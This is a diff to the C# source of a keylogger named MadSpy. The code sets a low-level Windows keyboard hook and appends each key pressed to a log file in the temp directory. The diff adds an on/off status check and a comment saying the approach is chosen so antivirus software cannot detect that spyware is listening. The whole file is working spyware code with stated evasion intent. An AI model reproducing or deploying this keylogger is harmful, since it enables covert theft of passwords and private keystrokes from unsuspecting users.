@@ -12,9 +12,11 @@ namespace MadSpy
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
+        private static Data _data;
 
-        public static void Record()
+        public static void Record(Data data)
         {
+            _data = data;
             _hookID = SetHook(_proc);
             Application.Run();
             UnhookWindowsHookEx(_hookID);
@@ -23,15 +25,21 @@ namespace MadSpy
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
-            using (ProcessModule curModule = curProcess.MainModule)
             {
-                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
-                    GetModuleHandle(curModule.ModuleName), 0);
+                using (ProcessModule curModule = curProcess.MainModule)
+                {
+                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                        GetModuleHandle(curModule.ModuleName), 0);
+                }
             }
         }
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
+        //
+        // Win32 utility is used to record key strokes, in such way, an antivirus will be unable to know
+        // that a spyware is listening
+        //
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
@@ -39,12 +47,21 @@ namespace MadSpy
                 long vkCode = Marshal.ReadInt64(lParam);
                 Console.WriteLine((Keys)vkCode);
 
-                lock (Program.LOGLOCK)
+                Status status;
+                lock (Program.DATALOCK) 
                 {
-                    using (var sw = new StreamWriter(Path.GetTempPath() + @"\log.txt", true))
+                    status = _data.Status;
+                }
+
+                if (status == Status.Active)
+                {
+                    lock (Program.LOGLOCK)
                     {
-                        sw.Write((Keys)vkCode);
-                        sw.Write("\r\n");
+                        using (var sw = new StreamWriter(Path.GetTempPath() + @"\log.txt", true))
+                        {
+                            sw.Write((Keys)vkCode);
+                            sw.Write("\r\n");
+                        }
                     }
                 }
             }
